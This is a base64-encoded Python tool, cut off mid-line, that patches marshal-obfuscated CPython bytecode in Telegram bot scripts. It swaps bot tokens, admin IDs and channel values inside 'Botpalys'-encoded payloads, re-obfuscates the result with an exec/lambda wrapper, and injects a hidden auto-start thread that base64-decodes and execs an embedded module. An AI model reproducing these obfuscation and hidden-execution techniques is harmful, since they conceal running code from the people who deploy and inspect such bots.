S0tIG1hcnNoYWwodjQpIHB1cmUtYnl0ZXMgc3RyZWFtIHBhdGNoZXIgKENQeXRob24gMy4xMSBsYXlvdXQpIC0tLS0KIyBQYXlsb2FkIGtlIGNvbnN0cyBrbyBzZWVkaGUgYnl0ZXMtbGV2ZWwgcGUgcGF0Y2gga2FydGEgaGUgKGJha2UtaW4pLgojIEt5dW5raSBpcyBwYXlsb2FkIHBlIG1hcnNoYWwuZHVtcHMgLyBjb2RlLnJlcGxhY2UgQ1B5dGhvbiBrbyBjcmFzaCBrYXJ0YSBoZSwKIyB5ZSB3YWxrZXIga2FiaGkgbG9hZHMvZHVtcHMvcmVwbGFjZSBuYWhpIGthcnRhIOKAlCBzaXJmIHJhdyBieXRlcyBwYXJzZS9zcGxpY2UuCiMgTGF5b3V0IG5vdGVzOiBsb25nICdsJyA9IDE1LWJpdCBkaWdpdHMgKiAyIGJ5dGVzOyBjb2RlICdjJyBtZSAzLjExIGthCiMgY29fcXVhbG5hbWUgc2xvdCBiaGkgaGUgKG5hbWUga2UgYmFhZCwgZmlyc3RsaW5lbm8gc2UgcGVobGUpLgoKaW1wb3J0IHN0cnVjdCBhcyBfbXBfcwppbXBvcnQgcmUgYXMgX21wX3JlCgoKZGVmIF9jbHpfbXBfbWtyZXAocGFpcnMpOgogICAgIiIiU2luZ2xlLXBhc3MgKGNhc2NhZGUtcHJvb2YpIHJlcGxhY2VyOiBhbHRlcm5hdGlvbiByZWdleCwgbG9uZ2VzdC1maXJzdC4iIiIKICAgIHByID0gW3AgZm9yIHAgaW4gcGFpcnMgaWYgcFswXSBhbmQgcFswXSAhPSBwWzFdXQogICAgaWYgbm90IHByOgogICAgICAgIHJldHVybiBsYW1iZGEgczogcwogICAgcGF0ID0gX21wX3JlLmNvbXBpbGUoInwiLmpvaW4oX21wX3JlLmVzY2FwZShvKSBmb3IgbywgXyBpbiBzb3J0ZWQocHIsIGtleT1sYW1iZGEgeDogLWxlbih4WzBdKSkpKQogICAgb20gPSBkaWN0KHByKQogICAgcmV0dXJuIGxhbWJkYSBzOiBwYXQuc3ViKGxhbWJkYSBtOiBvbVttLmdyb3VwKDApXSwgcykKCgpjbGFzcyBfY2x6X01QOgogICAgIiIiTWFyc2hhbCBzdHJlYW0gd2Fsa2VyIOKAlCBzaXJmIGNvX2NvbnN0cyBrZSBhbmRhciBrZSBzdHIvaW50IGxlYXZlcyByZWNvcmQuIiIiCgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGJ1Zik6CiAgICAgICAgc2VsZi5iID0gYnVmCiAgICAgICAgc2VsZi5pID0gMAogICAgICAgIHNlbGYubGVhdmVzID0gW10KCiAgICBkZWYgX3U4KHNlbGYpOgogICAgICAgIHYgPSBzZWxmLmJbc2VsZi5pXQogICAgICAgIHNlbGYuaSArPSAxCiAgICAgICAgcmV0dXJuIHYKCiAgICBkZWYgX2kzMihzZWxmKToKICAgICAgICB2ID0gX21wX3MudW5wYWNrX2Zyb20oIjxpIiwgc2VsZi5iLCBzZWxmLmkpWzBdCiAgICAgICAgc2VsZi5pICs9IDQKICAgICAgICByZXR1cm4gdgoKICAgIGRlZiBvYmooc2VsZiwgaWM9RmFsc2UpOgogICAgICAgIGIgPSBzZWxmLmIKICAgICAgICBuID0gbGVuKGIpCiAgICAgICAgaWYgc2VsZi5pID49IG46CiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkVPRiBhdCAlZCIgJSBzZWxmLmkpCiAgICAgICAgc3QgPSBzZWxmLmkKICAgICAgICB0YyA9IHNlbGYuX3U4KCkKICAgICAgICB0ID0gY2hyKHRjICYgMHg3RikKICAgICAgICBpZiB0ID09ICIwIjoKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgaWYgdCBpbiAoIk4iLCAiRiIsICJUIiwgIlMiLCAiLiIpOgogICAgICAgICAgICByZXR1cm4KICAgICAgICBpZiB0ID09ICJpIjoKICAgICAgICAgICAgdiA9IHNlbGYuX2kzMigpCiAgICAgICAgICAgIGlmIGljOgogICAgICAgICAgICAgICAgc2VsZi5sZWF2ZXMuYXBwZW5kKChzdCwgc2VsZi5pLCB0YywgImludCIsIHYpKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBpZiB0ID09ICJnIjoKICAgICAgICAgICAgc2VsZi5pICs9IDgKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgaWYgdCA9PSAieSI6CiAgICAgICAgICAgIHNlbGYuaSArPSAxNgogICAgICAgICAgICByZXR1cm4KICAgICAgICBpZiB0IGluICgiZiIsICJ4Iik6CiAgICAgICAgICAgIG0gPSBzZWxmLl9pMzIoKQogICAgICAgICAgICBzZWxmLmkgKz0gbQogICAgICAgICAgICByZXR1cm4KICAgICAgICBpZiB0ID09ICJsIjoKICAgICAgICAgICAgbSA9IHNlbGYuX2kzMigpCiAgICAgICAgICAgIG5lZyA9IG0gPCAwCiAgICAgICAgICAgIG0gPSAtbSBpZiBuZWcgZWxzZSBtCiAgICAgICAgICAgIHYgPSAwCiAgICAgICAgICAgIGZvciBrIGluIHJhbmdlKG0pOgogICAgICAgICAgICAgICAgdiB8PSAoYltzZWxmLmldIHwgKGJbc2VsZi5pICsgMV0gPDwgOCkpIDw8ICgxNSAqIGspCiAgICAgICAgICAgICAgICBzZWxmLmkgKz0gMgogICAgICAgICAgICBpZiBuZWc6CiAgICAgICAgICAgICAgICB2ID0gLXYKICAgICAgICAgICAgaWYgaWM6CiAgICAgICAgICAgICAgICBzZWxmLmxlYXZlcy5hcHBlbmQoKHN0LCBzZWxmLmksIHRjLCAiaW50IiwgdikpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGlmIHQgaW4gKCJzIiwgInQiLCAidSIsICJhIiwgIkEiKToKICAgICAgICAgICAgbSA9IHNlbGYuX2kzMigpCiAgICAgICAgICAgIHNlbGYuaSArPSBtCiAgICAgICAgICAgIGlmIHQgIT0gInMiIGFuZCBpYzoKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICB2ID0gYnl0ZXMoYltzdCArIDU6c2VsZi5pXSkuZGVjb2RlKCJ1dGYtOCIgaWYgdCA9PSAidSIgZWxzZSAiYXNjaWkiKQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgICAgICB2ID0gTm9uZQogICAgICAgICAgICAgICAgaWYgdiBpcyBub3QgTm9uZToKICAgICAgICAgICAgICAgICAgICBzZWxmLmxlYXZlcy5hcHBlbmQoKHN0LCBzZWxmLmksIHRjLCAic3RyIiwgdikpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGlmIHQgaW4gKCJ6IiwgIloiKToKICAgICAgICAgICAgbSA9IHNlbGYuX3U4KCkKICAgICAgICAgICAgc2VsZi5pICs9IG0KICAgICAgICAgICAgaWYgaWM6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgdiA9IGJ5dGVzKGJbc3QgKyAyOnNlbGYuaV0pLmRlY29kZSgiYXNjaWkiKQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgICAgICB2ID0gTm9uZQogICAgICAgICAgICAgICAgaWYgdiBpcyBub3QgTm9uZToKICAgICAgICAgICAgICAgICAgICBzZWxmLmxlYXZlcy5hcHBlbmQoKHN0LCBzZWxmLmksIHRjLCAic3RyIiwgdikpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGlmIHQgPT0gInIiOgogICAgICAgICAgICBzZWxmLl9pMzIoKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBpZiB0ID09ICIoIjoKICAgICAgICAgICAgbSA9IHNlbGYuX2kzMigpCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKG0pOgogICAgICAgICAgICAgICAgc2VsZi5vYmooaWMpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGlmIHQgPT0gIikiOgogICAgICAgICAgICBtID0gc2VsZi5fdTgoKQogICAgICAgICAgICBmb3IgXyBpbiByYW5nZShtKToKICAgICAgICAgICAgICAgIHNlbGYub2JqKGljKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBpZiB0ID09ICJbIjoKICAgICAgICAgICAgbSA9IHNlbGYuX2kzMigpCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKG0pOgogICAgICAgICAgICAgICAgc2VsZi5vYmooaWMpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGlmIHQgPT0gInsiOgogICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgaWYgc2VsZi5pID49IG46CiAgICAgICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiRU9GIGRpY3QgYXQgJWQiICUgc2VsZi5pKQogICAgICAgICAgICAgICAgaWYgY2hyKGJbc2VsZi5pXSAmIDB4N0YpID09ICIwIjoKICAgICAgICAgICAgICAgICAgICBzZWxmLmkgKz0gMQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBzZWxmLm9iaihpYykKICAgICAgICAgICAgICAgIHNlbGYub2JqKGljKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBpZiB0IGluICgiPCIsICI+Iik6CiAgICAgICAgICAgIG0gPSBzZWxmLl9pMzIoKQogICAgICAgICAgICBmb3IgXyBpbiByYW5nZShtKToKICAgICAgICAgICAgICAgIHNlbGYub2JqKGljKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBpZiB0ID09ICJjIjoKICAgICAgICAgICAgc2VsZi5faTMyKCkgICAgICAjIGFyZ2NvdW50CiAgICAgICAgICAgIHNlbGYuX2kzMigpICAgICAgIyBwb3Nvbmx5YXJnY291bnQKICAgICAgICAgICAgc2VsZi5faTMyKCkgICAgICAjIGt3b25seWFyZ2NvdW50CiAgICAgICAgICAgIHNlbGYuX2kzMigpICAgICAgIyBzdGFja3NpemUKICAgICAgICAgICAgc2VsZi5faTMyKCkgICAgICAjIGZsYWdzCiAgICAgICAgICAgIHNlbGYub2JqKEZhbHNlKSAgIyBjb19jb2RlIChieXRlcykKICAgICAgICAgICAgc2VsZi5vYmooVHJ1ZSkgICAjIGNvX2NvbnN0cwogICAgICAgICAgICBzZWxmLm9iaihGYWxzZSkgICMgY29fbmFtZXMKICAgICAgICAgICAgc2VsZi5vYmooRmFsc2UpICAjIGxvY2Fsc3BsdXNuYW1lcwogICAgICAgICAgICBzZWxmLm9iaihGYWxzZSkgICMgbG9jYWxzcGx1c2tpbmRzCiAgICAgICAgICAgIHNlbGYub2JqKEZhbHNlKSAgIyBmaWxlbmFtZQogICAgICAgICAgICBzZWxmLm9iaihGYWxzZSkgICMgbmFtZQogICAgICAgICAgICBzZWxmLm9iaihGYWxzZSkgICMgcXVhbG5hbWUgKDMuMTEpCiAgICAgICAgICAgIHNlbGYuX2kzMigpICAgICAgIyBmaXJzdGxpbmVubwogICAgICAgICAgICBzZWxmLm9iaihGYWxzZSkgICMgbGluZXRhYmxlCiAgICAgICAgICAgIHNlbGYub2JqKEZhbHNlKSAgIyBleGNlcHRpb250YWJsZQogICAgICAgICAgICByZXR1cm4KICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJ1bmtub3duIG1hcnNoYWwgdHlwZSAlciBAJWQiICUgKHQsIHN0KSkKCgpkZWYgX2Nsel9tcF9lbmNfc3RyKHYsIHRjKToKICAgIGQgPSB2LmVuY29kZSgidXRmLTgiKQogICAgZmwgPSB0YyAmIDB4ODAKICAgIGlmIGxlbihkKSA8IDI1NiBhbmQgZC5pc2FzY2lpKCk6CiAgICAgICAgcmV0dXJuIGJ5dGVzKFtmbCB8IDB4N0EsIGxlbihkKV0pICsgZAogICAgcmV0dXJuIGJ5dGVzKFtmbCB8IDB4NzVdKSArIF9tcF9zLnBhY2soIjxpIiwgbGVuKGQpKSArIGQKCgpkZWYgX2Nsel9tcF9lbmNfaW50KHYsIHRjKToKICAgIGZsID0gdGMgJiAweDgwCiAgICBpZiAtKDIgKiogMzEpIDw9IHYgPCAyICoqIDMxOgogICAgICAgIHJldHVybiBieXRlcyhbZmwgfCAweDY5XSkgKyBfbXBfcy5wYWNrKCI8aSIsIHYpCiAgICBuZWcgPSB2IDwgMAogICAgYSA9IC12IGlmIG5lZyBlbHNlIHYKICAgIGRzID0gW10KICAgIHdoaWxlIGE6CiAgICAgICAgZHMuYXBwZW5kKGEgJiAweDdGRkYpCiAgICAgICAgYSA+Pj0gMTUKICAgIGlmIG5vdCBkczoKICAgICAgICBkcyA9IFswXQogICAgcmV0dXJuIChieXRlcyhbZmwgfCAweDZDXSkgKyBfbXBfcy5wYWNrKCI8aSIsIC1sZW4oZHMpIGlmIG5lZyBlbHNlIGxlbihkcykpCiAgICAgICAgICAgICsgYiIiLmpvaW4oX21wX3MucGFjaygiPEgiLCBkKSBmb3IgZCBpbiBkcykpCgoKZGVmIF9jbHpfbXBfcGF0Y2gocGF5bG9hZCwgc3JlcCwgaXJlcCk6CiAgICAiIiJwYXlsb2FkIChtYXJzaGFsIGJ5dGVzLCBub3JtYWwgb3JkZXIpIC0+IChwYXRjaGVkIGJ5dGVzLCBuX2NoYW5nZWQpLiIiIgogICAgcCA9IF9jbHpfTVAocGF5bG9hZCkKICAgIHAub2JqKFRydWUpCiAgICBpZiBwLmkgIT0gbGVuKHBheWxvYWQpOgogICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIm1hcnNoYWwgc3RyZWFtIHRyYWlsaW5nICVkLyVkIGJ5dGVzIiAlIChwLmksIGxlbihwYXlsb2FkKSkpCiAgICBvdXQgPSBieXRlYXJyYXkoKQogICAgcG9zID0gMAogICAgbmNoID0gMAogICAgZm9yIChzdCwgZW4sIHRjLCBraW5kLCB2YWwpIGluIHAubGVhdmVzOgogICAgICAgIGlmIGtpbmQgPT0gInN0ciI6CiAgICAgICAgICAgIG52ID0gc3JlcCh2YWwpCiAgICAgICAgICAgIGlmIG52ID09IHZhbDoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIG91dCArPSBwYXlsb2FkW3BvczpzdF0KICAgICAgICAgICAgb3V0ICs9IF9jbHpfbXBfZW5jX3N0cihudiwgdGMpCiAgICAgICAgICAgIHBvcyA9IGVuCiAgICAgICAgICAgIG5jaCArPSAxCiAgICAgICAgZWxzZToKICAgICAgICAgICAgaWYgdmFsIGluIGlyZXAgYW5kIGlyZXAuZ2V0KHZhbCkgIT0gdmFsOgogICAgICAgICAgICAgICAgb3V0ICs9IHBheWxvYWRbcG9zOnN0XQogICAgICAgICAgICAgICAgb3V0ICs9IF9jbHpfbXBfZW5jX2ludChpcmVwW3ZhbF0sIHRjKQogICAgICAgICAgICAgICAgcG9zID0gZW4KICAgICAgICAgICAgICAgIG5jaCArPSAxCiAgICBvdXQgKz0gcGF5bG9hZFtwb3M6XQogICAgcmV0dXJuIGJ5dGVzKG91dCksIG5jaAoKCmRlZiBfY2x6X25wX3BheWxvYWQodHBsX3RleHQpOgogICAgIiIiTlAgd3JhcHBlciBsaW5lIHNlIHJldmVyc2VkLW1hcnNoYWwgcGF5bG9hZCBieXRlcyArIHdyYXBwZXIgbGluZSBuaWthbHRhIGhlLiIiIgogICAgd3JhcCA9IE5vbmUKICAgIGZvciBsbiBpbiB0cGxfdGV4dC5zcGxpdGxpbmVzKCk6CiAgICAgICAgaWYgbG4uc3RhcnRzd2l0aCgiXyA9IGxhbWJkYSIpOgogICAgICAgICAgICB3cmFwID0gbG4KICAgICAgICAgICAgYnJlYWsKICAgIGlmIG5vdCB3cmFwOgogICAgICAgIHJldHVybiBOb25lLCBOb25lCiAgICBwcmUgPSAiZXhlYygoXykoYiciCiAgICB0cnk6CiAgICAgICAgaTAgPSB3cmFwLmluZGV4KHByZSkgKyBsZW4ocHJlKQogICAgICAgIGkxID0gd3JhcC5pbmRleCgiJykpIiwgaTApCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICByZXR1cm4gTm9uZSwgTm9uZQogICAgX3EgPSBjaHIoMzkpICogMwogICAgcmF3ID0gZXZhbCgiYiIgKyBfcSArIHdyYXBbaTA6aTFdICsgX3EpCiAgICByZXR1cm4gcmF3Wzo6LTFdLCB3cmFwCgoKZGVmIF9jbHpfbnBfd3JhcGxpbmUocGF5bG9hZCk6CiAgICAiIiJQYXlsb2FkIGJ5dGVzIC0+IHRlbXBsYXRlLXN0eWxlIGVzY2FwZWQgYicuLi4nIHdyYXBwZXIgbGluZSAocmV2ZXJzZWQgb3JkZXIpLgogICAgQm90cGFseXMgZW5jb2RlciBqYWlzaSBoaSBlc2NhcGluZzogYiduIGIndCBiJ3IgcmF3LXByaW50YWJsZSwgYmFha2kgYid4Tk4uIiIiCiAgICBic2wgPSBjaHIoOTIpOyBzcSA9IGNocigzOSkKICAgIF9tID0gezEwOiBic2wgKyAibiIsIDk6IGJzbCArICJ0IiwgMTM6IGJzbCArICJyIiwgOTI6IGJzbCArIGJzbCwgMzk6IGJzbCArIHNxfQogICAgcGFydHMgPSBbXQogICAgZm9yIGMgaW4gcGF5bG9hZFs6Oi0xXToKICAgICAgICBlID0gX20uZ2V0KGMpCiAgICAgICAgaWYgZSBpcyBub3QgTm9uZToKICAgICAgICAgICAgcGFydHMuYXBwZW5kKGUpCiAgICAgICAgZWxpZiAzMiA8PSBjIDwgMTI3OgogICAgICAgICAgICBwYXJ0cy5hcHBlbmQoY2hyKGMpKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHBhcnRzLmFwcGVuZCgoYnNsICsgInglMDJ4IikgJSBjKQogICAgZXNjID0gIiIuam9pbihwYXJ0cykKICAgIHJldHVybiAiXyA9IGxhbWJkYSBfXyA6IF9faW1wb3J0X18oJ21hcnNoYWwnKS5sb2FkcyhfX1s6Oi0xXSk7ZXhlYygoXykoYiciICsgZXNjICsgIicpKSIKCgpkZWYgX2Nsel9ucF9pbmplY3QobWFya2VyKToKICAgICIiIk1pbmltYWwgbW9kdWxlLWluamVjdCBibG9jayAoa29pIG1hcnNoYWwgbW9ua2V5cGF0Y2ggbmFoaSDigJQgdmFsdWVzIHBheWxvYWQgbWUgYmFrZWQgaGUpLiIiIgogICAgbW9kX2I2NCA9IF9jbHpfYjY0bW9kKG1hcmtlcikKICAgIEwgPSBbXQogICAgTC5hcHBlbmQoIiMgPT09PSBDTE9ORSBCT09UIChBVVRPKSA9PT09IikKICAgIEwuYXBwZW5kKCJpbXBvcnQgdGhyZWFkaW5nIGFzIF9jYl90LCB0aW1lIGFzIF9jYl90bSIpCiAgICBMLmFwcGVuZCgiX0NCX0I2NCA9ICVzIiAlIGpzb24uZHVtcHMobW9kX2I2NCkpCiAgICBMLmFwcGVuZCgiYXN5bmMgZGVmIF9jYl9leGVjKF9nKToiKQogICAgTC5hcHBlbmQoIiAgICBpbXBvcnQgYmFzZTY0IGFzIF9jYl9iIikKICAgIEwuYXBwZW5kKCIgICAgX2dbJ0NMT05FX01PRFVMRV9CNjQnXSA9IF9DQl9CNjQiKQogICAgTC5hcHBlbmQoIiAgICBleGVjKGNvbXBpbGUoX2NiX2IuYjY0ZGVjb2RlKF9DQl9CNjQpLmRlY29kZSgndXRmLTgnKSwgJzxjbG9uZV9tb2Q+JywgJ2V4ZWMnKSwgX2cpIikKICAgIEwuYXBwZW5kKCJkZWYgX2NiX2Jvb3QoKToiKQogICAgTC5hcHBlbmQoIiAgICBfZyA9IGdsb2JhbHMoKSIpCiAgICBMLmFwcGVuZCgiICAgIGZvciBfaSBpbiByYW5nZSg2MDApOiIpCiAgICBMLmFwcGVuZCgiICAgICAgICBfYiA9IF9nLmdldCgnYm90JykiKQogICAgTC5hcHBlbmQoIiAgICAgICAgX2FyID0gX2cuZ2V0KCdGUF9BUk1PUl9ET05FJykiKQogICAgTC5hcHBlbmQoIiAgICAgICAgaWYgX2IgaXMgbm90IE5vbmUgYW5kIF9hcjoiKQogICAgTC5hcHBlbmQoIiAgICAgICAgICAgIHRyeToiKQogICAgTC5hcHBlbmQoIiAgICAgICAgICAgICAgICBpbXBvcnQgYXN5bmNpbyBhcyBfY2JfYWlvIikKICAgIEwuYXBwZW5kKCIgICAgICAgICAgICAgICAgX2xwID0gZ2V0YXR0cihfYiwgJ2xvb3AnLCBOb25lKSBvciBnZXRhdHRyKF9iLCAnX2xvb3AnLCBOb25lKSIpCiAgICBMLmFwcGVuZCgiICAgICAgICAgICAgICAgIF9jYl9haW8ucnVuX2Nvcm91dGluZV90aHJlYWRzYWZlKF9jYl9leGVjKF9nKSwgX2xwKS5yZXN1bHQodGltZW91dD0xODApIikKICAgIEwuYXBwZW5kKCIgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIF9lOiIpCiAgICBMLmFwcGVuZCgiICAgICAgICAgICAgICAgIHRyeToiKQogICAgTC5hcHBlbmQoIiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1tDTE9ORS1CT09UXSBmYWlsOicsIF9lKSIpCiAgICBMLmFwcGVuZCgiICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IikKICAgIEwuYXBwZW5kKCIgICAgICAgICAgICAgICAgICAgIHBhc3MiKQogICAgTC5hcHBlbmQoIiAgICAgICAgICAgIHJldHVybiIpCiAgICBMLmFwcGVuZCgiICAgICAgICBfY2JfdG0uc2xlZXAoMC41KSIpCiAgICBMLmFwcGVuZCgiICAgIHRyeToiKQogICAgTC5hcHBlbmQoIiAgICAgICAgaW1wb3J0IGFzeW5jaW8gYXMgX2NiX2FpbzIiKQogICAgTC5hcHBlbmQoIiAgICAgICAgX2IyID0gX2cuZ2V0KCdib3QnKSIpCiAgICBMLmFwcGVuZCgiICAgICAgICBpZiBfYjIgaXMgbm90IE5vbmU6IikKICAgIEwuYXBwZW5kKCIgICAgICAgICAgICBfbHAyID0gZ2V0YXR0cihfYjIsICdsb29wJywgTm9uZSkgb3IgZ2V0YXR0cihfYjIsICdfbG9vcCcsIE5vbmUpIikKICAgIEwuYXBwZW5kKCIgICAgICAgICAgICBfY2JfYWlvMi5ydW5fY29yb3V0aW5lX3RocmVhZHNhZmUoX2NiX2V4ZWMoZ2xvYmFscygpKSwgX2xwMikucmVzdWx0KHRpbWVvdXQ9MTgwKSIpCiAgICBMLmFwcGVuZCgiICAgIGV4Y2VwdCBFeGNlcHRpb246IikKICAgIEwuYXBwZW5kKCIgICAgICAgIHBhc3MiKQogICAgTC5hcHBlbmQoIl9jYl90LlRocmVhZCh0YXJnZXQ9X2NiX2Jvb3QsIGRhZW1vbj1UcnVlKS5zdGFydCgpIikKICAgIEwuYXBwZW5kKCIjID09PT0gRU5EIENMT05FIEJPT1QgKEFVVE8pID09PT0iKQogICAgcmV0dXJuICJcbiIuam9pbihMKQoKCmRlZiBfY2x6X3BhdGNoX25wKHRwbF90ZXh0LCB0b2tlbiwgYWRtaW4sIGNoMSwgbDIsIGwzLCBtYXJrZXIpOgogICAgbyA9IF9DTFpfTlBfT1JJRwogICAgIyAtLS0gZ2VuMjogcGVobGUgc2UgcGF0Y2hlZCBjbG9uZSBmaWxlIGtvIGRvYmFyYSBwYXRjaCBrYXJvIChjbG9uZS1pbi1jbG9uZSkgLS0tCiAgICBpZiAoIkNMT05FIEJPT1QgKEFVVE8pIiBpbiB0cGxfdGV4dCBhbmQgIl9DTFpfTUFSS0VSIiBpbiB0cGxfdGV4dAogICAgICAgICAgICBhbmQgIl8gPSBsYW1iZGEiIGluIHRwbF90ZXh0IGFuZCAiX0NCX0I2NCIgaW4gdHBsX3RleHQpOgogICAgICAgIG1vID0gcmUuc2VhcmNoKHIiXl9DTFpfTUFSS0VSID0gKC4qKSQiLCB0cGxfdGV4dCwgcmUuTSkKICAgICAgICBpZiBub3QgbW86CiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiZ2VuIE5QIG1hcmtlciBsaW5lIG5vdCBmb3VuZCIpCiAgICAgICAgYmFzZSA9IGpzb24ubG9hZHMobW8uZ3JvdXAoMSkpCiAgICAgICAgb2xkID0geyJ0b2tlbiI6IGJhc2UuZ2V0KCJ0b2tlbiIpLCAibDIiOiBiYXNlLmdldCgibDIiKSwgImwzIjogYmFzZS5nZXQoImwzIiksCiAgICAgICAgICAgICAgICJjaDEiOiBiYXNlLmdldCgiY2gxIiksICJzZXNzIjogYmFzZS5nZXQoInNlc3MiKX0KICAgICAgICBvbGRfYWRtaW4gPSBiYXNlLmdldCgiYWRtaW4iKSBvciAwCiAgICAgICAgbmV3diA9IHsidG9rZW4iOiB0b2tlbiwgImwyIjogbDIsICJsMyI6IGwzLCAiY2gxIjogY2gxLCAic2VzcyI6IG1hcmtlclsic2VzcyJdfQogICAgICAgIHBhaXJzID0gWyh2LCBuZXd2W2tdKSBmb3IgaywgdiBpbiBvbGQuaXRlbXMoKSBpZiB2IGFuZCB2ICE9IG5ld3Zba11dCiAgICAgICAgaXJlcCA9IHt9CiAgICAgICAgaWYgb2xkX2FkbWluIGFuZCBvbGRfYWRtaW4gIT0gYWRtaW46CiAgICAgICAgICAgIGlyZXBbb2xkX2FkbWluXSA9IGFkbWluCiAgICAgICAgICAgIHBhaXJzLmFwcGVuZCgoInRnOi8vdXNlcj9pZD0lZCIgJSBvbGRfYWRtaW4sICJ0ZzovL3VzZXI/aWQ9JWQiICUgYWRtaW4pKQogICAgICAgIHBheWxvYWQsIHdyYXAgPSBfY2x6X25wX3BheWxvYWQodHBsX3RleHQpCiAgICAgICAgaWYgcGF5bG9hZCBpcyBOb25lOgogICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoImdlbiBOUCB3cmFwcGVyIG5vdCBmb3VuZCIpCiAgICAgICAgc3JlcCA9IF9jbHpfbXBfbWtyZXAocGFpcnMpCiAgICAgICAgcGF0Y2hlZCwgbmNoID0gX2Nsel9tcF9wYXRjaChwYXlsb2FkLCBzcmVwLCBpcmVwKQogICAgICAgICMgQ2xlYW4gdGVtcGxhdGUtZm9ybSBvdXRwdXQ6IGxlZ2FjeSBib290LWJsb2NrL19DQl9CNjQvbWFya2VyIGxpbmVzCiAgICAgICAgIyBoYXRhIGRvIOKAlCB2YWx1ZXMgcGF5bG9hZCBtZSBoaSBiYWtlZCBoYWluLCBmaWxlIGJpbGt1bCB0ZW1wbGF0ZSBqYWlzaS4KICAgICAgICBoZHIgPSAoIiMgPT09PSBDTE9ORSBEQVRBID09PT1cbiIKICAgICAgICAgICAgICAgIiMgdG9rZW46ICVzXG4iCiAgICAgICAgICAgICAgICIjIGFkbWluOiAlZFxuIgogICAgICAgICAgICAgICAiIyBjaDE6ICVzXG4iCiAgICAgICAgICAgICAgICIjIGNoMjogJXNcbiIKICAgICAgICAgICAgICAgIiMgY2gzOiAlc1xuIgogICAgICAgICAgICAgICAiIyBzZXNzaW9uOiAlc1xuIgogICAgICAgICAgICAgICAiIyBydW46IHB5dGhvbjMuMTMgdGhpc19maWxlLnB5XG4iCiAgICAgICAgICAgICAgICIjID09PT0gRU5EIENMT05FIERBVEEgPT09PVxuIikgJSAodG9rZW4sIGFkbWluLCBjaDEsIGwyLCBsMywgbWFya2VyWyJzZXNzIl0pCiAgICAgICAgb3V0ID0gKGhkcgogICAgICAgICAgICAgICArICIjIE9iZnVzY2F0ZWQgYnkgdGhlIEJvdHBhbHlzIGVuY29kZXJcbiIKICAgICAgICAgICAgICAgIiNUaW1lOiBjbG9uZSBidWlsZFxuIgogICAgICAgICAgICAgICArIF9jbHpfbnBfd3JhcGxpbmUocGF0Y2hlZCkgKyAiXG4iKQogICAgICAgIGlmICJfID0gbGFtYmRhIiBub3QgaW4gb3V0IG9yICJtYXJzaGFsIiBub3QgaW4gb3V0OgogICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoImdlbiBOUCByZS1wYXRjaCBmYWlsZWQiKQogICAgICAgIHJldHVybiBvdXQKICAgICMgLS0tIGdlbjE6IG9yaWdpbmFsIHRlbXBsYXRlIC0+IHBheWxvYWQgbWUgdmFsdWVzIGJha2UgKyBpbmplY3QgYmxvY2sgLS0tCiAgICBwYXlsb2FkLCB3cmFwID0gX2Nsel9ucF9wYXlsb2FkKHRwbF90ZXh0KQogICAgaWYgcGF5bG9hZCBpcyBOb25lOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiTlAgd3JhcHBlciBsaW5lIG5vdCBmb3VuZCIpCiAgICBwYWlycyA9IFsKICAgICAgICAob1sidG9rZW4iXSwgdG9rZW4pLAogICAgICAgIChvWyJsMiJdLCBsMiksCiAgICAgICAgKG9bImwzIl0sIGwzKSwKICAgICAgICAob1siY2gxIl0sIGNoMSksCiAgICAgICAgKG9bInNlc3MiXSwgbWFya2VyWyJzZXNzIl0pLAogICAgXQogICAgZm9yIGEgaW4gb1siYWRtaW5zIl06CiAgICAgICAgcGFpcnMuYXBwZW5kKCgidGc6Ly91c2VyP2lkPSVkIiAlIGEsICJ0ZzovL3VzZXI/aWQ9JWQiICUgYWRtaW4pKQogICAgaXJlcCA9IHthOiBhZG1pbiBmb3IgYSBpbiBvWyJhZG1pbnMiXX0KICAgIHNyZXAgPSBfY2x6X21wX21rcmVwKHBhaXJzKQogICAgcGF0Y2hlZCwgbmNoID0gX2Nsel9tcF9wYXRjaChwYXlsb2FkLCBzcmVwLCBpcmVwKQogICAgaWYgbmNoIDwgMjA6CiAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJOUCBwYXlsb2FkIHBhdGNoIHRvbyBzbWFsbDogJWQiICUgbmNoKQogICAgIyBUZW1wbGF0ZS1leGFjdCBvdXRwdXQ6IG9yaWdpbmFsIHRlbXBsYXRlIGthIHRleHQsIFNJUkYgd3JhcHBlciBsaW5lIG1lCiAgICAjIGJha2VkIHB